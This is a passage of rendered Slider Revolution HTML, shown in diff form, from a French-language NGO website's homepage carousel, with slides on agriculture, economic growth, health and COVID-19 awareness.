translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">v</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">v</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">è</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">u</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">s</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">y</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">s</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">è</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">m</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">g</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">s</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">d</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">s</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 889.5px; top: 499px; z-index: 6; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-9-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:834px,257px,117px,540px;yo:499px,287px,294px,197px;" data-text="s:34;l:38;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 6; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: center; line-height: 38px; letter-spacing: 0px; font-weight: 700; font-size: 34px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true">DES PILIERS DE CROISSANCE<br>ECONOMIQUE 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 1031.5px; top: 586px; z-index: 8; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-9-layer-4" class="ocend-btn rev-btn rs-layer" data-type="button" data-color="rgba(255,255,255,1)" data-xy="xo:976px,283px,144px,121px;yo:586px,450px,452px,314px;" data-text="s:17;l:17;fw:500;" data-rsp_bd="off" data-padding="t:12;r:35;b:12;l:35;" data-frame_0="x:-50px;" data-frame_1="e:power2.inOut;st:500;sp:920;" data-frame_999="o:0;e:nothing;st:w;" data-frame_hover="c:#000;bgc:#fff;boc:#000;bor:0px,0px,0px,0px;bos:solid;oX:50;oY:50;sp:0;e:none;" style="z-index: 8; background-color: rgba(255, 100, 0, 0.74902); font-family: Roboto; cursor: pointer; outline: none; box-shadow: none; box-sizing: border-box; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 17px; letter-spacing: 0px; font-weight: 500; font-size: 17px; border-color: transparent; padding: 12px 35px; border-radius: 3px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" data-idcheck="true" data-stylerecorder="true" data-initialised="true">Agriculture 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+						<rs-slide data-key="rs-15" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="2" data-origindex="1" data-description="" data-sba="" data-scroll-based="false" data-owidth="1024" data-oheight="635" data-rspausetimeronce="0" style="overflow: hidden; height: 100%; width: 100%; z-index: 10; opacity: 1; visibility: inherit;" data-isactiveslide="false"><rs-sbg-px><rs-sbg-wrap data-key="rs-15" data-owidth="1024" data-oheight="635"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/2olkslider-copie.jpg" title="2olkslider copie" width="1024" height="635" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;" data-src-rs-ref="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/2olkslider-copie.jpg"><canvas width="1351" height="868" style="width: 100%; height: 100%; background-color: transparent; opacity: 1; filter: none; transform: translate(0px, 0px);"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 843.5px; top: 322px; z-index: 5; visibility: hidden;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; overflow: visible;"><rs-layer id="slider-3-slide-15-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:788px,402px,277px,127px;yo:322px,246px,243px,238px;" data-text="s:22;l:24;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 5; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 0; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">v</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">p</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">é</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">d</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">g</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">g</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">p</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">p</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">q</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">u</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">é</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">,</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">O</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">v</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">L</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">m</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">b</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">K</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">b</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 867.5px; top: 351px; z-index: 6; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-15-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:812px,257px,117px,540px;yo:351px,287px,294px,197px;" data-text="s:34;l:38;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 6; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: center; line-height: 38px; letter-spacing: 0px; font-weight: 700; font-size: 34px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true">SENSIBILISE SUR LA COVID-19 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 1058.5px; top: 435px; z-index: 8; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-15-layer-4" class="ocend-btn rev-btn rs-layer" data-type="button" data-color="rgba(255,255,255,1)" data-xy="xo:1003px,283px,144px,121px;yo:435px,450px,452px,314px;" data-text="s:17;l:17;fw:500;" data-rsp_bd="off" data-padding="t:12;r:35;b:12;l:35;" data-frame_0="x:-50px;" data-frame_1="e:power2.inOut;st:500;sp:920;" data-frame_999="o:0;e:nothing;st:w;" data-frame_hover="c:#000;bgc:#fff;boc:#000;bor:0px,0px,0px,0px;bos:solid;oX:50;oY:50;sp:0;e:none;" style="z-index: 8; background-color: rgba(255, 100, 0, 0.74902); font-family: Roboto; cursor: pointer; outline: none; box-shadow: none; box-sizing: border-box; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 17px; letter-spacing: 0px; font-weight: 500; font-size: 17px; border-color: transparent; padding: 12px 35px; border-radius: 3px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" data-idcheck="true" data-stylerecorder="true" data-initialised="true">Santé 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+						<rs-slide data-key="rs-16" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="3" data-origindex="2" data-description="" data-sba="" data-scroll-based="false" style="overflow: hidden; height: 100%; width: 100%; z-index: 10; opacity: 1; visibility: inherit;" data-owidth="1024" data-oheight="635" data-rspausetimeronce="0" data-isactiveslide="false"><rs-sbg-px><rs-sbg-wrap data-key="rs-16" data-owidth="1024" data-oheight="635"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/5olkslider-copie.jpg" title="5olkslider copie" width="1024" height="635" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;" data-src-rs-ref="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/5olkslider-copie.jpg"><canvas style="width: 100%; height: 100%; background-color: transparent; opacity: 1; filter: none; transform: translate(0px, 0px);" width="1351" height="868"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 826.5px; top: 204px; z-index: 11; visibility: hidden;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; overflow: visible;"><rs-layer id="slider-3-slide-16-layer-0" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:771px,402px,277px,127px;yo:204px,246px,243px,238px;" data-text="s:22;l:24;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 11; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 0; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">S</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">I</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">T</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">S</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">T</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">O</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">U</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">R</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">N</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">R</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">V</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">R</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">S</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">D</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">I</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">U</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">,</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">N</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">C</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">S</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">D</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">B</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">S</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">O</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">I</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">N</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
